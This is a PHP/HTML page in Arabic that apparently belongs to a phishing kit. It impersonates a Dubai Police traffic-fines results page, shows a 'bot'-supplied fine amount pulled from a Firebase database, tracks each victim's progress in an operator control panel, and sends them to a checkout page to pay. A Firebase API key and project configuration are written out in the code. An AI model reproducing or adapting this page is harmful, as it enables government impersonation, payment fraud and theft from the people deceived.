<?php
// صفحة عرض النتائج المعدلة - المهندس حسن
?>
<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>نتائج الاستعلام - شرطة دبي</title>
  <style>
    :root { --main-green: #008b47; --bg-color: #f4f7f6; }
    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body { margin: 0; padding: 0; background-color: var(--bg-color); font-family: 'Segoe UI', sans-serif; }

    .header-fixed {
      position: fixed; top: 0; width: 100%; z-index: 2000;
      display: flex; justify-content: center; align-items: center;
      padding: 10px 15px; background: linear-gradient(180deg, #008b47 0%, #4a4a4a 100%);
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }
    .logo-container img { height: 45px; }

    .container { max-width: 480px; margin: 90px auto 0; padding: 20px 15px; }
    .status-card, #resultBox {
      background: #fff; border-radius: 20px; padding: 30px;
      text-align: center; box-shadow: 0 8px 25px rgba(0,0,0,0.08);
    }

    .loader-ring {
      display: inline-block; width: 50px; height: 50px;
      border: 5px solid #f3f3f3; border-top: 5px solid var(--main-green);
      border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    #resultBox { display: none; border-right: 6px solid var(--main-green); text-align: right; }
    .amount-box { font-size: 35px; font-weight: 900; color: var(--main-green); margin: 10px 0; text-align: center; }
    
    .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px; }
    .info-label { color: #666; }
    .info-value { font-weight: bold; color: #333; }

    .pay-btn {
      width: 100%; height: 55px; background: var(--main-green); color: #fff;
      border: none; border-radius: 25px; font-size: 18px; font-weight: bold;
      margin-top: 20px; cursor: pointer;
    }
  </style>
</head>
<body>

<header class="header-fixed">
  <div class="logo-container"><img src="logo1.png"></div>
</header>

<div class="container">
  <div class="status-card" id="loadingCard">
    <div class="loader-ring"></div>
    <div style="font-weight:bold;">جاري استخراج المخالفات...</div>
    <p style="font-size:13px; color:#777;">يرجى عدم إغلاق المتصفح، يتم الآن فحص الملف المروري الخاص بك.</p>
  </div>

  <div id="resultBox">
    <div style="text-align:center; color:#666; font-size:14px;">إجمالي الغرامات المستحقة</div>
    <div class="amount-box"><span id="totalAmount">0</span> <small style="font-size:15px;">AED</small></div>
    
    <div class="info-row">
      <span class="info-label">رقم اللوحة:</span>
      <span class="info-value" id="plateDisplay">---</span>
    </div>
    <div class="info-row">
      <span class="info-label">حالة المخالفات:</span>
      <span class="info-value" style="color:red;">غير مدفوعة</span>
    </div>

    <button class="pay-btn" onclick="window.location.href='checkout.php'">دفع المخالفات الآن</button>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625"
    };
    
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const currentOrderId = sessionStorage.getItem("last_order_id");

    if (!currentOrderId) { window.location.href = "index.php"; }

    // مراقبة الطلب لحظياً
    db.collection("orders").doc(currentOrderId).onSnapshot((doc) => {
        if (doc.exists) {
            const data = doc.data();
            
            // 1. تحديث رقم اللوحة فوراً
            if(data.plate_number) {
                document.getElementById("plateDisplay").innerText = data.plate_number;
            }

            // 2. التحقق لو البوت حدد مبلغ (بجرب كل المسميات المحتملة)
            const finalAmount = data.amount || data.total_fines || data.total || null;

            if (finalAmount !== null && finalAmount !== "Checking...") {
                // إظهار النتيجة وإخفاء اللودر
                document.getElementById("loadingCard").style.display = "none";
                document.getElementById("resultBox").style.display = "block";
                document.getElementById("totalAmount").innerText = finalAmount;
                
                // تحديث الحالة في لوحة التحكم إن الزبون شاف النتيجة
                db.collection("active_visits").doc(currentOrderId).set({
                    page: "مشاهدة النتائج (مبلغ: " + finalAmount + ")",
                    last_seen: firebase.firestore.FieldValue.serverTimestamp()
                }, { merge: true });
            }
        }
    });
</script>
</body>
</html>
